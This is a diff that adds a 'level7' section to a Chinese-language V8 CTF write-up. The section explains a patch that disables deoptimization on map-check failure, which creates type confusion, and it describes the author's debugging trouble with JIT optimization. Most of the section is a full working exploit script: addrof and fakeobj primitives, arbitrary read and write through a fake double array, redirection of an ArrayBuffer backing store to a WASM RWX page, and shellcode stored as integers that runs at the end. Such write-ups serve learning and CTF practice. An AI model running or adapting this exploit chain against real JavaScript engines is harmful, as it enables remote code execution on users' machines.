@@ -418,3 +418,123 @@ while(1){}
 `addrof` primitive则有点蒙的成分。`addrof`primitive的原理是将object按照double map的读法读出来，因为object存储在数组里时存储的是自身的地址。碰巧`ArrayFunctionMap`会传给回调函数当前元素，只需在i（估计得是偶数。不过记为i也就看个乐呵，实际上除了0以外不可能用别的，太麻烦）索引时提前将i+3（`ArrayFunctionMap`里还是将数组元素按照double读取，因此一次读64位，区别于object数组一个元素只有32位）索引处的元素替换为object，后续i+1收到的参数就是object的地址。不过按照我的理解，最后返回的应该是`lowerhalf(addr)`，但实测地址在upperhalf。hmmmmm，我又漏了啥？
 
 另外环境又改回来了，没有PATH变量的问题。估计之前是我自己不小心把环境搞没的（
+
+## level7
+
+与前几题相比，难度曲线突然直线上升，其中调试占大头。我以为经过前几题的洗礼自己已经习惯并摸清一点规律了，没想到事实是连门槛都没摸到
+
+这题的patch内容不明显。问了deepseek，说是“注释掉了所有与 map 检查失败时触发 deoptimization 相关的代码”。复习了教程Part 5里的内容，分析出题目的漏洞如下：
+- 假设我定义了一个有参数的函数func
+- 连续调用上述函数多次，并保证传入的参数类型（对象的map）为A。此举会触发optimization，使v8推断func的参数类型就是A
+- 调用函数func，但传入类型为B的参数。这里由于传入的参数类型与先前的推断不符，会触发Deoptimization
+- 但patch将Deoptimization的逻辑去掉了，于是出现了类型混淆。即使传入的参数类型是B，函数内仍然将其按照类型A操作
+
+我的第一个思路如下：
+- 定义两个函数test和test2，在触发optimization过程时一个传double数组，一个传object数组
+- 用test构造addrof primitive。因为即使我们传入object数组，test内部仍将其看作double数组，便能直接读出object在数组中记录的地址
+- test2则是反过来，构造fakeobj primitive。即使我们传入double数组，test内部仍将其看作object数组，于是取出的是指定地址处的fakeobject
+
+这里注意，在优化后的函数里使用`%DebugPrint`查看参数会发现它们的map其实是正确的。我一度以为这里的类型混淆指的是v8整体判断错了某个object的map类型（`%DebugPrint`会输出错误的map），但根据chatgpt的说法，应该是被优化的函数内部“存在针对双精度数组的优化路径”。根据后续的表现，我猜测是函数内部不再实时判断传入的参数的map类型，类似“缓存”的概念；缓存参数的map后便直接按照缓存的方式处理，无视参数本来的map类型（但是懒得验证，不想看v8源码）
+
+`--trace-opt`可以查看v8是否优化了某个函数。如果打印的日志里包含`completed optimizing 0xaddr <JSFunction func (sfi = x)> (target TURBOFAN) OSR]`，则v8优化了名为`func`的函数。函数推断的参数类型可以用`%DebugPrint(func)`查看。假如出现类似下面的内容：
+```
+ - slot #0 CompareOp CompareOp:SignedSmall {
+     [0]: 1
+  }
+ - slot #1 LoadKeyed MONOMORPHIC
+   [weak] 0x3935001cb7f9 <Map[16](PACKED_DOUBLE_ELEMENTS)>: LoadHandler(Smi)(kind = kElement, allow out of bounds = 0, is JSArray = 1, alow reading holes = 0, elements kind = PACKED_DOUBLE_ELEMENTS) {
+     [1]: [weak] 0x3935001cb7f9 <Map[16](PACKED_DOUBLE_ELEMENTS)>
+     [2]: 4352
+  }
+```
+就说明函数推断的参数类型为`PACKED_DOUBLE_ELEMENTS`，即double数组
+
+到这里，我成功在pwndbg中得到了flag。“后续只需要跳出pwndbg再调试一些偏移就可以了吧”，我是这么想的。结果我低估了v8的邪恶。我发现exp无论如何都读不出来rwx_page_addr，但也不报错，就那样卡在那里，留给我一个诡异的`0x7ff8000000000000`。我仍然不知道这个值是哪里来的，不过根据之前的经验，这样一般是fake object的map错了。然而我调试了无数次，只能得出“map的地址没错，类型也是double数组”的结论。然后又调试了很久，终于发现问题是fakeobj primitive失效了。`--trace-opt`显示v8并没有优化test2函数。布什戈门，在pwndbg里不是优化得很好吗？怎么出了pwndbg后就莫名其妙不优化了？脚本我明明一个字没动？我怀疑过是函数调用的次数不够，甚至怀疑是v8不会优化参数为object数组类型的函数。结果却非常出乎意料：v8只会优化第一个函数
+
+……
+
+我尝试调换过test和test2调用的顺序，结果变成了test2被优化而test无论如何都不会被优化。如果只用一个for循环同时调用两个函数，则两者都不会被优化。更莫名其妙的是，相同的环境和脚本，第一次运行脚本不会被优化，后续再运行就可以了。完全不明白为什么……
+
+所以需要只用一个函数实现两个primitive。好像也不难，便有了下方的exp：
+```js
+RWX_PAGE_OFFSET=0x2c188n;
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+function lowerhalf(i) {
+	return i % 0x100000000n;
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+function optimize_me_please(arr,value,is_write){
+    if(is_write) arr[0]=value;
+    return arr[0];
+}
+var float_arr=[73.31];
+for (var huh=0; huh < 200000000; huh++) {
+    optimize_me_please(float_arr,13.37,true);
+}
+function addrof(in_obj) {
+    var evil=[in_obj];
+    return lowerhalf(ftoi(optimize_me_please(evil,1.1,false)));
+}
+function fakeobj(addr){
+    var obj = {"A":1};
+    var evil=[obj,obj];
+    optimize_me_please(evil,itof(addr),true);
+    return evil[0];
+}
+var arb_rw_arr = [itof(shift32(0x725n)+BigInt(0x1cb7f9)), 1.2];
+var arb_rw_arr_addr=addrof(arb_rw_arr);
+console.log(arb_rw_arr_addr);
+console.log(fakeobj(arb_rw_arr_addr));
+console.assert(fakeobj(arb_rw_arr_addr)[1]==arb_rw_arr[1]);
+function arb_read(addr) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(arb_rw_arr_addr+0x18n);
+    return ftoi(fake[0]);
+}
+function arb_write(addr, val) {
+    arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+    let fake = fakeobj(arb_rw_arr_addr+0x18n);
+    fake[0] = itof(BigInt(val));
+}
+let wasm_addr=addrof(wasm_instance);
+console.log(wasm_addr);
+var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET);
+console.log(rwx_page_addr);
+let buf_addr = addrof(shellcode_buf);
+let backing_store_addr = buf_addr + 0x24n;
+arb_write(backing_store_addr,rwx_page_addr);
+let dataview = new DataView(shellcode_buf);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+这我就不得不列出v8（和我）神奇的操作了：
+- 如果for循环内调用`optimize_me_please(float_arr,13.37,false)`，即最后一个参数不是true，则fakeobj primitive会失效。个人猜测原因是optimize_me_please原本的设计是内部根据is_write的值分出if和else两个分支，可能这样会使v8忽略一个分支而只优化另一个分支？
+- 在这里万物都会改变，只有double数组的map地址不会改变。我直接硬编码了`0x1cb7f9`，省了不少力
+- 数组的元素所在的地址突然跑到`addrof(arr)+0x18`去了
+- 一度认为是wasm_instance定义的位置干扰了arb_read，于是我把它移到了脚本较上方的位置。虽然后续发现没有关系，我也懒得改了
+- 如果脚本失败的话，末尾的`while(1){}`会一直运行。好像即使我`ctrl+c`也kill不掉……
+- 并非不难
+
+据说接下来的level8很难。感觉旅途要在这里结束了 :(
